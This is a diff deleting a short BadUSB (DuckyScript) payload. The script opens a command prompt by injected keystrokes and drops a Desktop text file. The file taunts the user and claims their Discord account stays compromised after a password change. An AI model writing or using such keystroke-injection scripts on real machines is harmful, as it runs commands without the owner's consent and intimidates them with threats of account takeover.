@@ -1,9 +1,0 @@
-GUI r
-DELAY 250
-STRING cmd
-DELAY 150
-ENTER
-DELAY 250
-STRING cd %USERPROFILE%\Desktop & echo Pwned by Venu2HD#1761 using (BadUSB)>IMPORTANT.TXT & echo Even if you change your Discord password,>>IMPORTANT.TXT & echo I will still be able to login... MUHAHAHAAA>>IMPORTANT.TXT & exit
-DELAY 150
-ENTER
